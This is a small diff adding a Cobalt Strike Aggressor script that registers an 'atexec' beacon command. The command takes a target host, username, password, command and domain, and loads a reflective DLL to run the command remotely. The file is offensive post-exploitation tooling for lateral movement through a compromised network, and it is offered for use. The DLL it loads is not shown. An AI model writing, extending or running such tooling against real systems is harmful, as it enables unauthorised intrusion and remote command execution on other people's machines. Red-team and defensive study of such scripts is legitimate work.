@@ -1,0 +1,11 @@
+$dll = "reflective_dll.dll";
+beacon_command_register(
+	"atexec", 
+	"atexec text to beacon log", 
+	"Synopsis: atexec [host] [username] [password] [command] [domain]\n");
+
+alias("atexec", {
+    $args = substr($0, 7);
+    bdllspawn($1, script_resource($dll), $args, "Atexec....", 10000, false);
+	blog($1, "My arguments are:" . substr($0, 7) . "\n");
+});
